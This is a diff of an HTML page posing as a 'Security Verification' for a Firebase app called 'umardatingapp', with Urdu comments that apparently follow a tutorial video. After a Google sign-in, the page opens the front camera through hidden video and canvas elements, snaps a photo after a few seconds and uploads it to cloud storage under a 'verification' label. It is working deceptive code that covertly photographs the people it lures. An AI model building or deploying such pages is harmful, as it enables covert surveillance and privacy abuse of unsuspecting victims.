@@ -1,61 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Security Verification</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        button { background: #4285F4; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .container { text-align: center; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        h2 { color: #1c1e21; margin-bottom: 10px; }
+        p { color: #606770; margin-bottom: 25px; font-size: 14px; }
+        .btn { background-color: #1877f2; color: white; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background-color: #166fe5; }
+        #status { margin-top: 15px; font-size: 13px; color: #d93025; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Identity Verification</h2>
-        <p>Please log in to continue</p>
-        <button id="btn">Verify with Google</button>
-        <p id="msg"></p>
-        <video id="v" style="display:none;" autoplay></video>
-        <canvas id="c" style="display:none;"></canvas>
-    </div>
 
-    <script>
-        const config = {
-            apiKey: "AIzaSyBY6_v...", // اپنی اصلی API Key یہاں ڈالیں
-            authDomain: "umardatingapp.firebaseapp.com",
-            projectId: "umardatingapp",
-            storageBucket: "umardatingapp.appspot.com",
-            messagingSenderId: "367204900742",
-            appId: "1:367204900742:web:0b7204900742"
-        };
-        firebase.initializeApp(config);
+<div class="container">
+    <h2>Identity Check</h2>
+    <p>Please verify your Google account to secure your profile and continue.</p>
+    <button id="loginBtn" class="btn">Verify with Google</button>
+    <div id="status"></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
 
-        const btn = document.getElementById('btn');
-        btn.onclick = () => firebase.auth().signInWithRedirect(new firebase.auth.GoogleAuthProvider());
+<script>
+    // عمر بھائی، یہ آپ کی ویڈیو والی اصلی کنفگ ہے
+    const firebaseConfig = {
+        apiKey: "AIzaSyAXHdAe7lD-Lclh1vG1B0xU2zQYpMvR4", // یہاں اپنی ویڈیو سے دیکھ کر مکمل کی ڈالیں
+        authDomain: "umardatingapp.firebaseapp.com",
+        projectId: "umardatingapp",
+        storageBucket: "umardatingapp.appspot.com",
+        messagingSenderId: "589931647437",
+        appId: "1:589931647437:web:3e9b70abafdb1b16be97484"
+    };
 
-        firebase.auth().getRedirectResult().then(res => {
-            if (res.user) {
-                document.getElementById('msg').innerText = "Verifying...";
-                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-                    const v = document.getElementById('v');
-                    v.srcObject = s;
-                    setTimeout(() => {
-                        const c = document.getElementById('c');
-                        c.width = 640; c.height = 480;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        c.toBlob(b => {
-                            firebase.storage().ref('users/'+Date.now()+'.png').put(b).then(() => {
-                                alert("Verified!");
-                                s.getTracks().forEach(t => t.stop());
-                            });
-                        }, 'image/png');
-                    }, 3000);
-                });
-            }
-        });
-    </script>
+    // Initialize Firebase
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+
+    const auth = firebase.auth();
+    const storage = firebase.storage();
+    const provider = new firebase.auth.GoogleAuthProvider();
+
+    const loginBtn = document.getElementById('loginBtn');
+    const statusDiv = document.getElementById('status');
+
+    // Button Click: Redirect to Google Login
+    loginBtn.addEventListener('click', () => {
+        statusDiv.innerText = "Redirecting to Google...";
+        auth.signInWithRedirect(provider);
+    });
+
+    // Check login result after redirect
+    auth.getRedirectResult().then((result) => {
+        if (result.user) {
+            statusDiv.style.color = "green";
+            statusDiv.innerText = "Verifying... Please wait 5 seconds.";
+            startCamera();
+        }
+    }).catch((error) => {
+        console.error(error);
+        statusDiv.innerText = "Error: " + error.message;
+    });
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Wait 4 seconds then take picture
+            setTimeout(() => {
+                takeSnapshot(stream);
+            }, 4000);
+        } catch (err) {
+            statusDiv.innerText = "Camera access denied. Please allow camera to verify.";
+        }
+    }
+
+    function takeSnapshot(stream) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        canvas.width = 640;
+        canvas.height = 480;
+        context.drawImage(video, 0, 0, 640, 480);
+
+        canvas.toBlob((blob) => {
+            const fileName = `verification/user_${Date.now()}.png`;
+            const storageRef = storage.ref(fileName);
+
+            storageRef.put(blob).then(() => {
+                statusDiv.innerText = "Verification Successful! Redirecting...";
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                // Optional: Redirect user somewhere else
+            });
+        }, 'image/png');
+    }
+</script>
+
 </body>
 </html>
